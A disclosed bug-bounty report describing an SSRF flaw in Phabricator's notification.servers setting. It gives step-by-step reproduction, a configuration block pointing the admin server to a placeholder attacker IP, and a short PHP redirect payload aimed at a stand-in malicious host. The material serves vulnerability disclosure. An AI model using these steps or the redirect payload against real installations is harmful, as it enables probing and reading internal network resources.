# SSRF in notifications.server configuration

## Report Details
- **Report ID**: 850114
- **URL**: https://hackerone.com/reports/850114
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-04-15T04:21:16.539Z
- **Disclosed**: 2020-05-15T14:10:22.270Z

## Reporter
- **Username**: codeprivate
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: phabricator

## Vulnerability Information
<mongoose>

Modifying the notification server settings so that it connects to a malicious server. An attacker is able to redirect traffic from the vulnerable application to internal or external network resources.
Steps To Reproduce:
---------------------
 1. Open your phabricator installation authenticated with an administrator user.
 2. Go to Config> Settings> notification.servers
 3. Copy the values ​​of "Simple Example" and replace them in "Database Value" with the attacker's data. ( in type admin block )

something like that:
```
[
  {
    "type": "client",
    "host": "phabricator.mycompany.com",
    "port": 22280,
    "protocol": "https"
  },
  {
    "type": "admin",
    "host": "X.X.X.X",
    "port": 22281,
    "protocol": "http"
  }
]
```
Being X.X.X.X is the IP of the malicious server.

4 . The malicious server receives a GET request from the victim server to the path "/ status", puts an index.php file in that directory of his server and can redirect the destination of the original request to internal or external assets.

PoC
```
<?php
header("Location: http://anywere.loc/bad_intentions");
?>
```

</mongoose>

## Impact

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources, and scan for internal ports and get the versions of the services running on the server.
Referer: https://www.owasp.org/index.php/Server_Side_Request_Forgery

I made a video exploiting this vulnerability in my own phabricator installation. demonstrating the steps to reproduce, and making 2 types of attacks possible with this.
 (F788864)

## Attachments
- SSRF-Phabricator-POC.mp4
